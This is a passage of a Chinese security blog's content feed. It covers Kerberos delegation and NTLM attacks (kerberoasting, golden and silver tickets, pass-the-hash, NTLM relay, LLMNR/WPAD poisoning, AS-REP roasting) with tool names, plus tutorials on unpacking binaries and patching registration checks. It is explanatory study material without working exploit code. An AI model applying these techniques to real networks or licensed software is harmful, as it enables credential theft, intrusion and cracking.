alt="img"></p><ol><li>服务1使用S4U2self代表用户admin获取针对服务本身的Kerberos。则服务1代表用户向服务1本身发起请求，所以cname是服务1，sname也是服务1。</li><li>如果TGS支持PA_FOR_USER扩展，则TGS在步骤2中通过KRB_TGS_REP消息返回用户的服务票证。需要满足以下要求：<ul><li>TGT可转发</li><li>服务配置约束委派</li><li>TGS将票据标志设为可转发</li></ul></li></ol><p>注意：如果用户的UserAccountControl设置USER_NOT_DELEGATED位，则无法转发TGS。即设置敏感用户，不能被委派。</p><h2 id="S4U2proxy"><a href="#S4U2proxy" class="headerlink" title="S4U2proxy"></a>S4U2proxy</h2><p>s4u2proxy使得服务1可以使用来自s4u2self用户本身的授权，然后通过TGS向KDC请求访问服务2的TGS且只能访问服务2。</p><p>s4u2proxy流程</p><p><img src="https://img.rruu.net/image/606abbc9d80c9" alt="img"></p><p>服务1代表用户获取访问服务2的服务票据。服务1发送KRB_TGS_REQ请求，将服务1的服务票据作为请求中的AddtionTicket。需要满足以下条件：</p><ol><li>从S4u2self阶段获取TGS票据放在AddtionTicket</li><li>在KPB_TGS_REQ请求中设置CNAME-IN-ADDL-TKT标志</li><li>服务请求设置可转发</li><li>服务1拥有到服务2的约束委派，服务2的SPN放在sname中。</li></ol><p>满足以上条件则在步骤2中TGS会制作KRB_TGS_REP消息以返回服务票据，可转发标志将在服务票证中设置。</p><p>s4u2self返回的票据是否可以转发？</p><ol><li>AddtionTicket 票据可转发<ul><li>KDC Options里面置forwarable位则返回的票据可以转发</li></ul></li><li>AddtionTicket 票据不可转发<ul><li>服务1到服务2配置基于资源的约束委派</li><li>PA-PAC-OPTION 设置 Resource-Based Constrained Delegation标志位</li><li>返回的TGS票据是可转发的</li></ul></li></ol><h2 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h2><h3 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h3><p>假如服务被配置了非约束委派，则服务可以接受任何用户委派其去请求其他所有服务。</p><p>重点：某用户委托A去访问B服务，则A用户会将TGT发送给B服务并<strong>缓存到LSASS进程</strong>中，方便以后使用，接着B服务模拟用户去请求某个服务。</p><h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h3><p>假如服务被配置了约束委派，则约束委派将限制指定服务器代表用户执行服务。需要域管理员特权（SeEnableDelegation特权）</p><h3 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h3><p>基于资源的约束委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员。</p><p>注意：基于资源的约束委派只能在运行Windows Server 2012 R2和Windows Server 2012的域控制器上配置，但可以在混合模式林中应用。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>传统的约束委派S4U2Self返回的票据一定是可转发的，否则S4u2proxy将失败。</p><p>基于资源的约束委派就算S4U2Self返回的票据不可转发S4U2Proxy也是可以成功，并且S4U2Proxy返回的票据总是可转发。</p><h2 id="相关的安全问题"><a href="#相关的安全问题" class="headerlink" title="相关的安全问题"></a>相关的安全问题</h2><h3 id="pass-the-ticket"><a href="#pass-the-ticket" class="headerlink" title="pass the ticket"></a>pass the ticket</h3><p> Kerbreos 除了第一步AS_ERQ是使用时间戳加密用户hash验证之外，其他的步骤的验证都是通过票据，这个票据 可以是TGT票据或者TGS票据。因为票据里面的内容主要是session_key和ticket(使用服务hash加密的，服务包括krbtgt)。</p><h3 id="kerberosting"><a href="#kerberosting" class="headerlink" title="kerberosting"></a>kerberosting</h3><p>因为TGS_REP里面ticket里的enc_part，是使用要请求的服务的hash加密的，所以我们可以通过爆破获得服务的hash。因为用户向KDC发起TGS_REQ请求，不管用户对服务是否有访问权限只要TGT正确就会返回TGS。</p><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>TGS_REP里面的ticket的encpart是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据，这个票据也被称为白银票据。伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用。</p><h3 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h3><p>如果我们找到配置非约束的委派的账户，并且通过一定手段拿下该账户的权限，然后诱导域管访问该服务，域管会将自己TGT发送到该服务并缓存到LSASS中，那我们就可以从LSASS中导出域管的TGT票据，然后通过PTT，从而拥有域管的权限。</p><h3 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h3><p>假如我们找到了约束委派的服务账号并且拿下该账号所在的机器，那么我们就可以利用这个服务账号代表任意用户进行s4u2self（<strong>服务代表用户获得针对服务自身的kerberos票据这个过程，服务是不需要用户的凭据的</strong>），获得可转发票据以后我们在通过s4u2proxy获取一个未转发的TGS，服务就可以代替用户访问另外一个服务。约束的委派并不需要用户访问，但是只能访问特定的服务(。</p><h3 id="基于资源的约束委派攻击"><a href="#基于资源的约束委派攻击" class="headerlink" title="基于资源的约束委派攻击"></a>基于资源的约束委派攻击</h3><p>基于资源的约束委派具有传统的约束委派的所有安全问题，基于资源的约束委派的利用更简单。普通的约束委派的配置需要SeEnableDelegation权限，一般只有Domain Admin有权限。因此，我们想要利用传统的委派攻击则必须先要寻找已有委派的机器。假设我们有A与B服务的权限，则我们可以通过配置A B服务的基于资源的与约束委派，这样A服务就可以控制B服务。</p><h2 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h2><h3 id="rubeus"><a href="#rubeus" class="headerlink" title="rubeus"></a>rubeus</h3><ul><li>asktgs 发送tgs请求包以base64打印</li><li>kerberoasting 支持对所有用户或者特定用户执行kerberoasting操作，其原理在于先用LDAP查询于内的spn，再通过发送TGS包，提取拼接得到hashcat或者john能爆破的格式。</li><li>monitor/harvest 用于非约束委派的利用 rubeus的monitor或者harvest模块会从日志里面过滤出 4624 ，然后提取TGT票据打印出来。</li><li>s4u 发起一个约束委派的流程</li></ul><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><ul><li>kerberos::golden 制作白银票据,票据格式是kirbi</li><li>kerberos::ptt 用于 pass the ticket</li><li>sekurlsa::tickets 导出票据</li></ul><h3 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h3><ul><li>getST.py 将请求服务票证并将其另存为ccache</li><li>GetUserSPNs.py 查找和获取与普通用户帐户关联的服务主体名称。输出与JtR和HashCat兼容。</li><li>ticketer.py 制作票据</li></ul><h2 id="Kerberost"><a href="#Kerberost" class="headerlink" title="Kerberost"></a>Kerberost</h2><p>Kerberoast是用于攻击MS Kerberos实现的一系列工具</p><h3 id="Powermad"><a href="#Powermad" class="headerlink" title="Powermad"></a>Powermad</h3><p>利用ms-DS-MachineAccountQuota的功能，而无需将实际系统附加到AD。</p><h2 id="Book链接"><a href="#Book链接" class="headerlink" title="Book链接"></a>Book链接</h2><p>Book：<a href="https://daiker.gitbook.io/windows-protocol/">https://daiker.gitbook.io/windows-protocol/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NTLM之NTLM基础</title>
      <link href="2021/03/23/NTLM%E4%B9%8BNTLM%E5%9F%BA%E7%A1%80/"/>
      <url>2021/03/23/NTLM%E4%B9%8BNTLM%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="LM-hash-amp-NTLM-hash"><a href="#LM-hash-amp-NTLM-hash" class="headerlink" title="LM hash &amp; NTLM hash"></a>LM hash &amp; NTLM hash</h2><ul><li><p>Windows内部只保存密码的hash</p><ol><li>本机用户的hash密码放在SAM文件</li><li>域内用户的hash密码放在域控的NTDS.DIT文件中</li></ol></li><li><pre><code>  Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::  AAD3B435B51404EEAAD3B435B51404EE是LM hash  31D6CFE0D16AE931B73C59D7E0C089C0是NTLM hash</code></pre></li></ul><h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><p>加密规则：</p><ol><li>用户的密码转换为大写，密码转换为16进制字符串，不足14字节将会用0来再后面补全。</li><li>密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</li><li>再分7bit为一组,每组末尾加0，再组成一组</li><li>上步骤得到的二组，分别作为key 为 “<code>KGS!@#$%</code>“进行DES加密。</li><li>将加密后的两组拼接在一起，得到最终LM HASH值。</li></ol><p>规则漏洞：</p><ul><li>密码长度不超过14个字符</li><li>密码不区分大小写，先转换成大写，所有密码都转换为大写。</li><li>分组使用DES加密，如果密码小于7位那么第二组加密后的结果是aad3b435b51404ee。如果lmhash结尾aad3b435b51404ee则密码小于7位。</li><li>一串密码，分为7+7。则这串密码的有效强度小于14位密码加密的强度。</li><li>Des密码强度不高</li></ul><h2 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h2><p>Windows操作系统LM 与 NTLM 支持情况：</p><p><img src="https://img.rruu.net/image/606abbb5c1165" alt="img"></p><p>NTLM Hash计算</p><ol><li>先将用户密码转换为十六进制格式。</li><li>将十六进制格式的密码进行Unicode编码。</li><li>使用MD4摘要算法对Unicode编码数据进行Hash计算。</li></ol><h2 id="NTLM身份验证"><a href="#NTLM身份验证" class="headerlink" title="NTLM身份验证"></a>NTLM身份验证</h2><p>NTLM验证是一种Challenge/Response 验证机制</p><ol><li>协商</li><li>质询</li><li>身份验证</li></ol><p><img src="https://img.rruu.net/image/606abbbc1cee8" alt="img"></p><p>详细的过程：<a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#0x02-ntlm-shen-fen-yan-zheng">https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#0x02-ntlm-shen-fen-yan-zheng</a></p><h2 id="相关安全问题"><a href="#相关安全问题" class="headerlink" title="相关安全问题"></a>相关安全问题</h2><h3 id="PTH（pass-the-hash）"><a href="#PTH（pass-the-hash）" class="headerlink" title="PTH（pass the hash）"></a>PTH（pass the hash）</h3><p>hash传递，在type3进行response的时候，客户端使用用户的hash计算的，而不是用户密码计算的。所以，我们可以使用hash模拟用户登录。微软发布了kb2871997，可以缓解哈希传递攻击同时阻止mimikatz抓取密码。为什么说是缓解呢？当我们使用ntlm认证，RID非500的会受到UAC限制，RID为500的用户登录之后可以完全管理特权。</p><p>这里再说一点，HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy项存在且配置为一，讲未过滤非RID500的用户连接，并且可以成功传递hash。</p><h3 id="NTLM信息收集"><a href="#NTLM信息收集" class="headerlink" title="NTLM信息收集"></a>NTLM信息收集</h3><p>在type2返回Challenge的过程中，同时返回了操作系统类型，主机名，netbios名等等。ntlm是一个嵌入式的协议，消息的传输依赖于使用ntlm的上层协议，比如SMB,LDAP,HTTP等。我们在能跟服务器进行ntlm 交流中，给服务器发送一个type1的请求，服务器返回type2的响应，这一步，我们就可以得到很多信息。</p><h3 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM Relay"></a>NTLM Relay</h3><h4 id="发起ntlm请求"><a href="#发起ntlm请求" class="headerlink" title="发起ntlm请求"></a>发起ntlm请求</h4><ol><li>desktop.ini</li><li>scf文件</li><li>用户头像</li><li>系统自带命令外带unc传输ntlm</li><li>xss 传输 只支持ie与edge</li><li>outlook邮箱</li><li>pdf</li><li>office</li><li>mysql</li><li>XXE</li><li>SSRF</li><li>打印机漏洞</li></ol><h4 id="NBNS和LLMNR"><a href="#NBNS和LLMNR" class="headerlink" title="NBNS和LLMNR"></a>NBNS和LLMNR</h4><h5 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h5><p>LLMNR是一种基于DNS数据包格式。Windows解析域名顺序是 Hosts&gt;DNs&gt;LLMNR&gt;NBNS</p><p>LLMNR解析过程：</p><ol><li>检查本地 NetBIOS 缓存</li><li>如果缓存中没有则会像当前子网域发送广播</li><li>当前子网域的其他主机收到并检查广播包，如果没有主机响应则请求失败</li></ol><p>由于使用广播包的方式，我们可以通过类似于ARP投毒的方式进行攻击，使用工具Responder。</p><h5 id="NBNS"><a href="#NBNS" class="headerlink" title="NBNS"></a>NBNS</h5><p>Netbios解析过程：</p><ol><li>检查本地 NetBIOS 缓存</li><li>如果缓存中没有请求的名称且已配置了 WINS 服务器，接下来则会向 WINS 服务器发出请求</li><li>如果没有配置 WINS 服务器或 WINS 服务器无响应则会向当前子网域发送广播</li><li>如果发送广播后无任何主机响应则会读取本地的 lmhosts 文件</li></ol><p>跟LLMNR同样使用广播包，存在同样的安全问题。</p><h4 id="WDAP和Mitm6"><a href="#WDAP和Mitm6" class="headerlink" title="WDAP和Mitm6"></a>WDAP和Mitm6</h4><h5 id="wpad"><a href="#wpad" class="headerlink" title="wpad"></a>wpad</h5><p>wpad 全称是Web Proxy Auto-Discovery Protocol ，通过让浏览器自动发现代理服务器，定位代理配置文件PAC(在下文也叫做PAC文件或者wpad.dat)，下载编译并运行，最终自动使用代理访问网络。</p><p>流程图：</p><img src="./NTLM之NTLM基础.assets/t019d8c1f08fefc8c39.png" alt="img" style="zoom: 33%;" /><p>查询PAC文件顺序</p><ol><li>通过DHCP服务器</li><li>查询WPAD主机的IP<ul><li>Hosts</li><li>DNS (cache / server) </li><li>LLMNR</li><li>NBNS </li></ul></li></ol><h5 id="配合LLMNR-NBNS投毒"><a href="#配合LLMNR-NBNS投毒" class="headerlink" title="配合LLMNR/NBNS投毒"></a>配合LLMNR/NBNS投毒</h5><p>用户在访问网页时，首先会查询PAC文件的位置。查询的地址是WPAD/wpad.dat。如果没有在域内专门配置这个域名的话，那么DNS解析失败的话，就会使用LLMNR发起广播包询问WPAD对应的ip是多少,这个时候我们就可以进行LLMNR投毒和NBNS投毒。Responder可以很方便得实现。</p><h5 id="配合DHCPv6"><a href="#配合DHCPv6" class="headerlink" title="配合DHCPv6"></a>配合DHCPv6</h5><p>ipv6比ipv4优先级高，我们可以伪造ipv6 dhcp服务器。mitm6：<a href="https://github.com/fox-it/mitm6">https://github.com/fox-it/mitm6</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos之AS_REQ和AS_REP学习</title>
      <link href="2021/03/23/Kerberos%E4%B9%8BAS_REQ%E5%92%8CAS_REP%E5%AD%A6%E4%B9%A0/"/>
      <url>2021/03/23/Kerberos%E4%B9%8BAS_REQ%E5%92%8CAS_REP%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="Kerberos介绍"><a href="#Kerberos介绍" class="headerlink" title="Kerberos介绍"></a>Kerberos介绍</h2><p>kerberos是由MIT提出的一种网络验证，使用密钥技术通过客户端与服务端提供的身份验证。</p><p>Kerberos协议中一般有三个角色：</p><ul><li>用户（Client）</li><li>服务器（Server）</li><li>KDC（密钥分发中心）</li></ul><p><img src="https://img.rruu.net/image/606abbccf3bf4" alt="img"></p><p>流程如下：</p><ol><li>Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳。</li><li>KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组。</li><li>TGS_REQ: Client凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求</li><li>TGS_REP: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)</li><li>AP_REQ: Client拿着TGS票据去请求服务</li><li>AP_REP: 服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。</li></ol><h2 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS_REQ"></a>AS_REQ</h2><ol><li><p>用户向KDC发起AS_REQ,请求凭据是用户 hash加密的时间戳。请求凭据放在PA_DATA里面。</p></li><li><p>pvno  kerberos的版本号</p></li><li><p>msg-type 请求类型，AS_REQ对应的就是KRB_AS_REQ(0x0a)</p></li><li><p>PA_DATA 认证消息列表</p></li></ol><ul><li>ENC_TIMESTAMP 用户hash加密时间戳。AS服务器使用用户hash进行解密，获得时间戳。如果能解密，且时间戳在一定范围内，则通过验证。</li><li>PA_PAC_REQUEST 启用PAC支持的扩展，PAC包含在AS_REQ的响应body(AS_REP)。这里的value对应的是include=true或者include=false(KDC根据include的值来判断返回的票据中是否携带PAC)。</li></ul><ol start="5"><li><p>REQ_BODY</p><ul><li>cname 在AS_REQ里面cname 是请求的用户,这个用户名存在和不存在，返回的包有差异，可以用于枚举域内用户名。</li><li>sname 在AS_REQ里面sname是krbtgt</li><li>realm 域名</li><li>from 发送时间</li><li>till rubeus和kekeo都是20370913024805Z，流量特征。</li><li>nonce 随机生成的一个数kekeo/mimikatz nonce是12381973，rubeus nonce是1818848256，流量特征。</li><li>etype  加密类型</li></ul></li></ol><h2 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS_REP"></a>AS_REP</h2><ol><li>KDC使用用户 hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含用户的sid，用户所在的组。</li><li>msg-type AS_REQ的响应body对应的就是KRB_AS_REP(0x0b)</li><li>crealm 域名</li><li>cname 用户名</li><li>ticket 用于TGS_REQ的认证。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的，因此如果我们拥有krbtgt的hash就可以自己制作一个ticket，既黄金票据。</li><li>enc_part 可以解密，key是用户hash，解密后得到Encryptionkey，Encryptionkey里面最重要的字段是session key，作为下阶段的认证密钥。</li></ol><h2 id="导出的票据"><a href="#导出的票据" class="headerlink" title="导出的票据"></a>导出的票据</h2><p>凭据里面最核心的东西是session-key和加密的ticket。</p><ol><li>mimikatz kekeo rubeus 生成kirbi</li><li>impacket生成.ccache</li><li>都包含session-key与加密的ticket，可以相互转换。</li></ol><h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><h3 id="pass-the-hash-和-pass-the-key"><a href="#pass-the-hash-和-pass-the-key" class="headerlink" title="pass the hash 和 pass the key"></a>pass the hash 和 pass the key</h3><p>在认证的时候使用的是用户的hash加密时间戳，就算使用的是密码也需要先加密成hash，然后再认证。</p><h3 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h3><p>在AS_REQ中cname请求的用户名，存在与不存在返回包有差异，可以用户枚举域内用户。可以通过修改cname的值枚举用户名，有账号通过LDAP查询即可。如果有域内机器的system权限，则域内用户的用户名是机器名$.。</p><h3 id="Password-Spraying"><a href="#Password-Spraying" class="headerlink" title="Password Spraying"></a>Password Spraying</h3><p>在已有用户名的情况下，可以尝试爆破密码。在实战中，通常使用密码喷射，即固定密码，不固定用户名。</p><h3 id="AS-REPRoasting"><a href="#AS-REPRoasting" class="headerlink" title="AS-REPRoasting"></a>AS-REPRoasting</h3><p>对于域用户，如果设置了选项”Do not require Kerberos preauthentication”，此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP内容(enc-part底下的ciper，因为这部分是使用用户hash加密session-key，我们通过进行离线爆破就可以获得用户hash)重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令。获取AS_REP里面enc-part部分里面的ciper，然后组装成前面32位16进制字符+$+后面的16进制字符得到repHash,然后<code>format(&quot;$krb5asrep$23$&#123;0&#125;@&#123;1&#125;:&#123;2&#125;&quot;, userName, domain, repHash)</code>得到字符串，交给hashcat 破解就行</p><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>在AS_REP中，ticket的encpart是使用krbtgt的hash进行加密的，我们可以抓取krbtg的hash，签发任意用户的tgt票据即黄金票据。</p><h2 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h2><h3 id="rubeus"><a href="#rubeus" class="headerlink" title="rubeus"></a>rubeus</h3><ol><li>asktgt 发送tgt请求包以base64输出</li><li>As-repoasting 通过LDAP查询域内用户设置了选项”Do not require Kerberos preauthentication”，然后发AS_REQ的包，直接生成hash或者john可破解的格式。</li></ol><h3 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h3><ol><li>getTGT 给定密码 hash 或者 aeskey 请求tgt保存为文件</li><li>GetNPUsers 尝试设置了”Do not require Kerberos preauthentication”的用户并列出TGT，与JtR兼容。</li><li>ticketer 发起合法的KDC请求并创建黄金票据or白银票据，票据格式为.ccache</li></ol><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><ol><li>kerberos::golden 制作黄金票据</li></ol><h3 id="nmap-NSE脚本"><a href="#nmap-NSE脚本" class="headerlink" title="nmap NSE脚本"></a>nmap NSE脚本</h3><ol><li>krb5-enum-users 枚举域内用户</li></ol><h3 id="DomainPasswordSpray"><a href="#DomainPasswordSpray" class="headerlink" title="DomainPasswordSpray"></a>DomainPasswordSpray</h3><p>使用powershell编写，对域内进行密码喷射。先从LDAP获取域用户列表，然后去除锁定用户，接着进行密码喷射。</p><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>Book链接：<a href="https://daiker.gitbook.io/windows-protocol/">https://daiker.gitbook.io/windows-protocol/</a></p><p>Kerberos测试工具下载地址：<a href="https://github.com/daikerSec/windows_protocol/raw/master/tools/kerberosGui.exe">https://github.com/daikerSec/windows_protocol/raw/master/tools/kerberosGui.exe</a></p><p>对kerberos协议还有疑问的不妨看看这个，这篇文章特别有意思：<a href="https://ares-x.com/2020/03/12/%E6%88%8F%E8%AF%B4%E5%9C%B0%E7%8B%B1%E4%B8%89%E5%A4%B4%E7%8A%AC/">https://ares-x.com/2020/03/12/%E6%88%8F%E8%AF%B4%E5%9C%B0%E7%8B%B1%E4%B8%89%E5%A4%B4%E7%8A%AC/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows API快速破解</title>
      <link href="2021/01/30/7.Windows%20api%E5%BF%AB%E9%80%9F%E7%A0%B4%E8%A7%A3/"/>
      <url>2021/01/30/7.Windows%20api%E5%BF%AB%E9%80%9F%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>tips：</p><p>mov edi，edi</p><p>windows api调用特征</p><h2 id="MessageBox"><a href="#MessageBox" class="headerlink" title="MessageBox"></a>MessageBox</h2><p>函数原型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int&#96; &#96;WINAPI MessageBox(&#96;&#96;HWND&#96; &#96;hWnd,&#96;&#96;LPCTSTR&#96; &#96;lpText,&#96;&#96;LPCTSTR&#96; &#96;lpCaption,&#96;&#96;UINT&#96; &#96;uType);</span><br></pre></td></tr></table></figure><p>hWnd：此参数代表消息框拥有的窗口。如果为NULL，则消息框没有拥有窗口。</p><p>lpText：消息框的内容。</p><p>lpCaption：消息框的标题。</p><p>uType：指定一个决定对话框的内容和行为的位标志集。</p><p>如何定位？</p><p>搜索MessageBoxW MessageBoxA 堆栈窗口反汇编窗口中跟随，然后再次跟第二层。</p><p><img src="https://img.rruu.net/image/6051550bc79a6" alt="image-20210126233558483"></p><p>跟着call看跳转到上面去找关键代码。</p><p><img src="https://img.rruu.net/image/605155119dc8e" alt="image-20210126234009038"></p><h2 id="SetWindowsText"><a href="#SetWindowsText" class="headerlink" title="SetWindowsText"></a>SetWindowsText</h2><p>设置窗口标题</p><h2 id="CreateWindowStaion"><a href="#CreateWindowStaion" class="headerlink" title="CreateWindowStaion"></a>CreateWindowStaion</h2><p>蓝屏api，本来是正常的，飘零写了一个蓝屏的暗转。碰到这个一定要小心，这个蓝屏暗装超级恶心。</p><p>CreateWindowStationA 此处下断点，nop填充，或者ret结束。ret结束需要保持堆栈平衡。</p><p>RtlAdjustPrivilege 此处下断点，nop填充，或者ret结束。ret结束需要保持堆栈平衡。</p><h2 id="ShellExecute"><a href="#ShellExecute" class="headerlink" title="ShellExecute"></a>ShellExecute</h2><p>打开url 文件等等</p><p>ShellExecuteA ShellExecuteW</p><h2 id="CreateWindowsEx"><a href="#CreateWindowsEx" class="headerlink" title="CreateWindowsEx"></a>CreateWindowsEx</h2><p>创建窗体</p><p>CreateWindowsExA</p><p>CreateWindowsExW</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>脱壳常用方法</title>
      <link href="2021/01/29/6.%E8%84%B1%E5%A3%B3%E6%96%B9%E6%B3%95/"/>
      <url>2021/01/29/6.%E8%84%B1%E5%A3%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>不必纠结于脱壳，除非你做逆向，破解一般不用特别管壳，SDK例外。</p><h2 id="单步跟踪法"><a href="#单步跟踪法" class="headerlink" title="单步跟踪法"></a>单步跟踪法</h2><p>过于繁琐，不做演示。</p><ul><li>F7 F8 jmp往上跳 则F4跳过jmp，一般使用F8，如果F8直接加载程序了，重来，下断点，F7进call。</li></ul><h2 id="esp定律法"><a href="#esp定律法" class="headerlink" title="esp定律法"></a>esp定律法</h2><ul><li><p>单步一次</p></li><li><p>给esp下硬件断点</p></li></ul><h2 id="内存镜像法"><a href="#内存镜像法" class="headerlink" title="内存镜像法"></a>内存镜像法</h2><ul><li>给资源块下段，然后给代码段下断点。</li></ul><h2 id="出口标志法"><a href="#出口标志法" class="headerlink" title="出口标志法"></a>出口标志法</h2><ul><li>有的语言开头有pushad他对应的就有popad</li></ul><h2 id="ImpREC与LordPE脱壳"><a href="#ImpREC与LordPE脱壳" class="headerlink" title="ImpREC与LordPE脱壳"></a>ImpREC与LordPE脱壳</h2><p>使用od脱壳失败，或者lordpe脱壳失败。需要修复指针，我们使用imprec修复。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>常见的破解方法以及寻找关键代码</title>
      <link href="2021/01/28/5.%E5%B8%B8%E8%A7%81%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95/"/>
      <url>2021/01/28/5.%E5%B8%B8%E8%A7%81%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="何为关键跳与Call"><a href="#何为关键跳与Call" class="headerlink" title="何为关键跳与Call"></a>何为关键跳与Call</h2><p>什么是关键跳？</p><p>一般来说关键跳就是程序验证阶段调用的验证跳转，通过call的返回进行跳转。我们可以通过修改跳转地址，将假的结果修改为真。或者修改跳转地址，跳转到其他窗口。</p><p>什么是关键call？</p><p>一般来说关键call就是程序验证阶段调用的验证函数，寻找关键call是分析程序重要的一点。</p><p>如何破解？</p><p>我们寻找关键call，有的call是文本比较必然有注册码比较，我们可以直接看到注册码。其次，我们也可以修改注册码比较函数的返回结果。或者修改跳转方向，将程序跳转至注册码正确的代码。</p><p>易语言代码示例如下（精易模块）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.版本 2</span><br><span class="line">.支持库 spec</span><br><span class="line"></span><br><span class="line">.程序集 窗口程序集_启动窗口</span><br><span class="line"></span><br><span class="line">.子程序 __启动窗口_创建完毕</span><br><span class="line"></span><br><span class="line">编辑框1.内容 ＝ 系统_取CPU序列号 ()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.子程序 _按钮1_被单击</span><br><span class="line">.局部变量 注册码, 文本型</span><br><span class="line">.局部变量 机器码, 文本型</span><br><span class="line"></span><br><span class="line">机器码 ＝ 系统_取CPU序列号 ()</span><br><span class="line">注册码 ＝ 文本_颠倒 (机器码)</span><br><span class="line">调试输出 (注册码)</span><br><span class="line">.如果 (注册码 ＝ 编辑框2.内容)</span><br><span class="line">    载入 (窗口1, , 真)</span><br><span class="line">.否则</span><br><span class="line">    信息框 (“注册码错误”, 0, , )</span><br><span class="line">.如果结束</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="寻找关键跳与call"><a href="#寻找关键跳与call" class="headerlink" title="寻找关键跳与call"></a>寻找关键跳与call</h2><h3 id="查找关键字符串"><a href="#查找关键字符串" class="headerlink" title="查找关键字符串"></a>查找关键字符串</h3><p>od打开程序</p><p><img src="https://img.rruu.net/image/605154e994726" alt="image-20210126172733575"></p><p>快捷键alt+e来到模块列表，双击程序。来到入口点，右键中文搜索，选择智能搜索。</p><p><img src="https://img.rruu.net/image/605154ef8f529" alt="image-20210126172941358"></p><p>拉到最上面，看见中文，直接双击。</p><p><img src="https://img.rruu.net/image/605154f5916a6" alt="image-20210126173145584"></p><p>发现程序的关键代码</p><p><img src="https://img.rruu.net/image/605154fb81c91" alt="image-20210126173658870"></p><h3 id="信息框堆栈回溯"><a href="#信息框堆栈回溯" class="headerlink" title="信息框堆栈回溯"></a>信息框堆栈回溯</h3><p>拖进od，F9运行。随便输入，点击进入软件。</p><p><img src="https://img.rruu.net/image/60515500a53b0" 